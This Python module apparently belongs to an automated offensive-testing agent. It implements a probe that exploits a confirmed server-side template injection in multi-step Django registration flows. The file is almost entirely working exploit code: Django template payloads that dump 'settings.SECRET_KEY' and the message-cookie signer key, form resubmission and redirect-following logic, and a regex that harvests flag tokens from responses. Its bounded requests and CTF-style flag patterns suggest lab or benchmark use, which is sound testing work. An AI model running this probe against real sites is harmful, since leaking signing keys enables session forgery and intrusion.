# ruff: noqa: CPY001

from __future__ import annotations

import json
import re
import time
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from typing import TYPE_CHECKING
from urllib.parse import urlsplit

from ravage.deterministic_agents.auth_forms import (
    _forms_from_html,
    _fresh_form_from_response,
    _submit_form,
)
from ravage.deterministic_agents.auth_identity import (
    _identity,
    _identity_fields,
)
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.web_core.proof_recognizer import recognize_proofs

if TYPE_CHECKING:
    from ravage.agent_core.agent_state import AgentState
    from ravage.web_core.http_probe import ProbeResponse, ProbeSession

PROBE_NAME = "ssti_deferred_context_closure"
PROBE_PURPOSE = (
    "close a confirmed deferred multi-step template-injection workflow with a "
    "bounded context-variable matrix, preserved cookies/forms, and exact proof"
)

_PROOF_PAYLOADS = (
    "{{ messages.storages.0.signer.key }}",
    "{{ messages.storage.signer.key }}",
    "{{ settings.SECRET_KEY }}",
    "{{ flag }}",
    "{{ ctf_flag }}",
    "{{ proof }}",
)
_REGISTRATION_MARKERS = ("register", "registration", "signup", "sign-up", "wizard")
_DEFERRED_MARKERS = (
    "deferred_form_flow_signal",
    "deferred registration",
    "multi-step",
    "registration step",
    "ssti_stored_signal",
)
_MAX_FORMS = 2
_MAX_FOLLOWUP_STEPS = 4
_MAX_REQUESTS = 28
_WALL_SECONDS = 55.0
_EMBEDDED_PROOF = re.compile(
    r"(?:flag|FLAG|HTB|CTF|XBEN)\{[^}\s]{3,256}\}",
)


@dataclass(frozen=True)
class DeferredSstiContract:
    endpoint: str
    method: str
    payload_field: str
    required_fields: tuple[str, ...]

    def to_json(self) -> dict[str, object]:
        return {
            "endpoint": self.endpoint,
            "method": self.method,
            "payload_field": self.payload_field,
            "required_fields": list(self.required_fields),
        }


def deferred_ssti_contract(state: AgentState) -> DeferredSstiContract | None:
    """Return the strongest target-observed deferred-form contract, if confirmed."""
    if not _confirmed_deferred_ssti(state):
        return None
    candidates: list[tuple[int, str, dict[str, object], DeferredSstiContract]] = []
    evidence_text = _deferred_evidence_text(state)
    for form in _state_forms(state):
        contract = _contract_for_form(form)
        if contract is None:
            continue
        score = _contract_score(
            form,
            contract=contract,
            evidence_text=evidence_text,
        )
        candidates.append((score, contract.endpoint, form, contract))
    if not candidates:
        return None
    candidates.sort(key=lambda item: (-item[0], item[1]))
    best_score, _endpoint, _form, contract = candidates[0]
    return contract if best_score > 0 else None


def probe_ssti_deferred_context_closure(
    session: ProbeSession,
    state: AgentState,
) -> ProbeRunResult:
    contract = deferred_ssti_contract(state)
    if contract is None:
        return _inactive_result(
            "no confirmed deferred SSTI plus target-observed registration contract"
        )
    forms = [
        form for form in _state_forms(state) if _same_contract(_contract_for_form(form), contract)
    ][:_MAX_FORMS]
    if not forms:
        return _inactive_result("the selected deferred SSTI form is unavailable")

    started = time.monotonic()
    requests: list[dict[str, object]] = []
    errors: list[str] = []
    for payload in _PROOF_PAYLOADS:
        if _deadline_exceeded(started) or len(requests) + 2 > _MAX_REQUESTS:
            break
        for source_form in forms:
            if _deadline_exceeded(started) or len(requests) + 2 > _MAX_REQUESTS:
                break
            isolated = session.fork(timeout_seconds=session.timeout_seconds)
            finding = _run_contract(
                isolated,
                source_form=source_form,
                contract=contract,
                payload=payload,
                requests=requests,
                errors=errors,
                started=started,
            )
            if finding is not None:
                return ProbeRunResult(
                    ok=True,
                    probe=PROBE_NAME,
                    summary=(
                        "target proof recognized through the confirmed deferred "
                        f"template workflow; requests={len(requests)}"
                    ),
                    findings=[finding],
                    requests=requests,
                    errors=errors,
                )

    return ProbeRunResult(
        ok=False,
        probe=PROBE_NAME,
        summary=(
            "bounded deferred template context matrix exhausted without "
            f"target-returned proof; requests={len(requests)}"
        ),
        requests=requests,
        errors=errors,
    )


def _run_contract(  # noqa: C901, PLR0912, PLR0913, PLR0915
    session: ProbeSession,
    *,
    source_form: dict[str, object],
    contract: DeferredSstiContract,
    payload: str,
    requests: list[dict[str, object]],
    errors: list[str],
    started: float,
) -> dict[str, object] | None:
    page = session.get(contract.endpoint)
    requests.append(
        _request_receipt(
            page,
            phase="refresh_form",
            contract=contract,
            payload=payload,
        )
    )
    if page.error:
        errors.append(f"refresh_form:{page.error}")
        return None
    live_form = _fresh_form_from_response(source_form, page) or source_form
    identity = _identity("deferred")
    fields = _identity_fields(live_form, identity)
    if contract.payload_field not in fields:
        return None
    fields[contract.payload_field] = payload
    visited_pages = {_flow_key(page.final_url)}
    submitted_forms = {_form_key(live_form)}
    response = _submit_form(session, live_form, fields)
    requests.append(
        _request_receipt(
            response,
            phase="submit_context_payload",
            contract=contract,
            payload=payload,
        )
    )
    proof = _proof_finding(
        response,
        contract=contract,
        payload=payload,
        followup_endpoints=(),
    )
    if proof is not None:
        return proof

    current = response
    followed: list[str] = []
    for _step in range(_MAX_FOLLOWUP_STEPS):
        if _deadline_exceeded(started) or len(requests) >= _MAX_REQUESTS:
            break
        location = str(
            current.headers.get("location") or current.headers.get("Location") or ""
        ).strip()
        if location:
            if not session.in_scope(location):
                errors.append("deferred_followup_out_of_scope")
                break
            if len(requests) >= _MAX_REQUESTS:
                break
            current = session.get(location)
            followed.append(current.final_url)
            current_key = _flow_key(current.final_url)
            repeated_page = current_key in visited_pages
            visited_pages.add(current_key)
            requests.append(
                _request_receipt(
                    current,
                    phase="follow_redirect",
                    contract=contract,
                    payload=payload,
                )
            )
            proof = _proof_finding(
                current,
                contract=contract,
                payload=payload,
                followup_endpoints=followed,
            )
            if proof is not None:
                return proof
            if repeated_page:
                break

        next_form = _next_form(current)
        if next_form is None:
            break
        form_key = _form_key(next_form)
        if form_key in submitted_forms:
            break
        if len(requests) >= _MAX_REQUESTS:
            break
        submitted_forms.add(form_key)
        next_fields = _identity_fields(next_form, identity)
        current = _submit_form(session, next_form, next_fields)
        followed.append(str(next_form.get("action") or current.final_url))
        requests.append(
            _request_receipt(
                current,
                phase="submit_followup_form",
                contract=contract,
                payload=payload,
            )
        )
        proof = _proof_finding(
            current,
            contract=contract,
            payload=payload,
            followup_endpoints=followed,
        )
        if proof is not None:
            return proof
    return None


def _proof_finding(
    response: ProbeResponse,
    *,
    contract: DeferredSstiContract,
    payload: str,
    followup_endpoints: Sequence[str],
) -> dict[str, object] | None:
    proofs = _context_response_proofs(response.body)
    if not proofs:
        return None
    return {
        "type": "ssti_deferred_context_proof",
        "channel": "deferred_multi_step_template_context",
        "proof": proofs[0],
        "proofs": proofs,
        "payload": payload,
        "contract": contract.to_json(),
        "followup_endpoints": list(dict.fromkeys(followup_endpoints)),
        "response": response.summary(body_chars=900),
        "replay": {
            "method": contract.method,
            "url": contract.endpoint,
            "payload_field": contract.payload_field,
            "required_fields": list(contract.required_fields),
            "followup_steps": list(dict.fromkeys(followup_endpoints)),
        },
    }


def _context_response_proofs(body: str) -> list[str]:
    """
    Recognize proof tokens embedded in a rendered Django context value.

    Django's message-cookie signer exposes its key as a bytes representation
    prefixed by ``django.http.cookies``. That prefix can be directly adjacent to
    the proof token, so the deliberately conservative global recognizer's word
    boundary does not match. Keep the relaxed boundary local to this confirmed,
    deferred-SSTI specialist and pass every extracted token back through the
    global placeholder/canonicalization rules.
    """
    proofs = recognize_proofs(body)
    for match in _EMBEDDED_PROOF.finditer(body):
        for candidate in recognize_proofs(" " + match.group(0)):
            if candidate not in proofs:
                proofs.append(candidate)
    return proofs


def _next_form(response: ProbeResponse) -> dict[str, object] | None:
    forms = _forms_from_html(
        response.final_url,
        response.body,
        auth_headers={},
        base_categories=(),
    )
    for form in forms:
        action = str(form.get("action") or "")
        if action and str(form.get("method") or "GET").upper() in {"GET", "POST"}:
            return form
    return None


def _request_receipt(
    response: ProbeResponse,
    *,
    phase: str,
    contract: DeferredSstiContract,
    payload: str,
) -> dict[str, object]:
    return response.summary(body_chars=620) | {
        "probe_kind": "ssti_deferred_context_step",
        "phase": phase,
        "contract": contract.to_json(),
        "payload": payload,
    }


def _confirmed_deferred_ssti(state: AgentState) -> bool:
    primitive_names = " ".join(state.primitives).lower()
    if "ssti" not in primitive_names or not any(
        marker in primitive_names for marker in ("confirmed", "unlocked")
    ):
        return False
    evidence = _deferred_evidence_text(state)
    return any(marker in evidence for marker in _DEFERRED_MARKERS)


def _deferred_evidence_text(state: AgentState) -> str:
    values: list[str] = [
        *state.facts,
        *state.hypotheses,
        *[str(value) for value in state.signals.get("markers", [])],
    ]
    for task in state.tasks:
        values.extend(str(item) for item in task.get("evidence", []) if item)
    values.extend(
        json.dumps(attempt, sort_keys=True, default=str) for attempt in state.attempts[-20:]
    )
    return " ".join(values).lower()


def _state_forms(state: AgentState) -> tuple[dict[str, object], ...]:
    forms: list[dict[str, object]] = []
    raw_surface = state.surface.get("forms")
    if isinstance(raw_surface, list):
        forms.extend(dict(item) for item in raw_surface if isinstance(item, Mapping))
    for raw in state.signals.get("forms", []):
        value: object = raw
        if isinstance(raw, str):
            try:
                value = json.loads(raw)
            except json.JSONDecodeError:
                continue
        if isinstance(value, Mapping):
            forms.append(dict(value))
    unique: dict[str, dict[str, object]] = {}
    for form in forms:
        identity = json.dumps(
            {
                "action": form.get("action"),
                "method": form.get("method"),
                "inputs": _input_names(form),
            },
            sort_keys=True,
        )
        unique.setdefault(identity, form)
    return tuple(unique.values())


def _contract_for_form(
    form: Mapping[str, object],
) -> DeferredSstiContract | None:
    endpoint = str(form.get("action") or form.get("page") or "").strip()
    method = str(form.get("method") or "GET").upper()
    if not endpoint or method != "POST":
        return None
    names = _input_names(form)
    payload_field = _payload_field(form)
    if not payload_field or not any("pass" in name.lower() for name in names):
        return None
    return DeferredSstiContract(
        endpoint=endpoint,
        method=method,
        payload_field=payload_field,
        required_fields=tuple(names),
    )


def _contract_score(
    form: Mapping[str, object],
    *,
    contract: DeferredSstiContract,
    evidence_text: str,
) -> int:
    text = json.dumps(form, sort_keys=True, default=str).lower()
    path = urlsplit(contract.endpoint).path.lower()
    score = 0
    if any(marker in path for marker in _REGISTRATION_MARKERS):
        score += 160
    if "step" in path or "wizard" in path:
        score += 80
    if path and path in evidence_text:
        score += 180
    if any(marker in text for marker in ("csrf", "session")):
        score += 30
    if contract.payload_field.lower() in {"name", "display_name", "username"}:
        score += 40
    return score


def _payload_field(form: Mapping[str, object]) -> str:
    preferred: list[tuple[int, str]] = []
    raw_inputs = form.get("inputs")
    if not isinstance(raw_inputs, list):
        return ""
    for raw in raw_inputs:
        if not isinstance(raw, Mapping):
            continue
        name = str(raw.get("name") or "").strip()
        input_type = str(raw.get("type") or "text").lower()
        lowered = name.lower()
        if (
            not name
            or input_type
            in {"hidden", "password", "email", "submit", "button", "checkbox", "radio"}
            or any(marker in lowered for marker in ("csrf", "token", "pass", "email"))
        ):
            continue
        rank = 0 if lowered in {"name", "display_name", "username"} else 1
        preferred.append((rank, name))
    preferred.sort()
    return preferred[0][1] if preferred else ""


def _input_names(form: Mapping[str, object]) -> list[str]:
    names: list[str] = []
    raw_inputs = form.get("inputs")
    if not isinstance(raw_inputs, list):
        return names
    for raw in raw_inputs:
        if not isinstance(raw, Mapping):
            continue
        name = str(raw.get("name") or "").strip()
        input_type = str(raw.get("type") or "").lower()
        if name and input_type not in {"button", "reset", "image"}:
            names.append(name)
    return list(dict.fromkeys(names))


def _same_contract(
    candidate: DeferredSstiContract | None,
    selected: DeferredSstiContract,
) -> bool:
    return (
        candidate is not None
        and candidate.endpoint == selected.endpoint
        and candidate.method == selected.method
        and candidate.payload_field == selected.payload_field
    )


def _flow_key(url: str) -> str:
    parsed = urlsplit(url)
    path = parsed.path.rstrip("/") or "/"
    return f"{parsed.scheme.lower()}://{parsed.netloc.lower()}{path}"


def _form_key(form: Mapping[str, object]) -> str:
    return "|".join(
        (
            str(form.get("method") or "GET").upper(),
            _flow_key(str(form.get("action") or form.get("page") or "")),
            ",".join(_input_names(form)),
        )
    )


def _deadline_exceeded(started: float) -> bool:
    return time.monotonic() - started >= _WALL_SECONDS


def _inactive_result(reason: str) -> ProbeRunResult:
    return ProbeRunResult(
        ok=False,
        probe=PROBE_NAME,
        summary=f"deferred SSTI closure inactive: {reason}",
    )


__all__ = [
    "PROBE_NAME",
    "PROBE_PURPOSE",
    "DeferredSstiContract",
    "deferred_ssti_contract",
    "probe_ssti_deferred_context_closure",
]
